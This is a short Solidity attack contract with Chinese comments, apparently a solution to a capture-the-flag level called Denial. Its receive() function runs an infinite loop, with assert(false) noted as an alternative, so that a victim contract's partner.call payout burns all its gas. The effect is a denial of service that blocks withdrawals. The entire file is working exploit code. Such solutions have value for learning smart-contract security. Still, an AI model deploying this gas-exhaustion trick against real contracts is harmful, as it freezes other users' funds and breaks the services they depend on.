// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackDenial {
    // 這是受害者合約的地址
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // 當 Denial 執行 partner.call{value: amountToSend}("") 時，會觸發這裡
    receive() external payable {
        // 方案 A: 無窮迴圈 (最暴力有效)
        while (true) {}
        
        // 方案 B: 也可以用 assert(false)，在舊版本這會燒光 Gas
        // assert(false);
    }
}
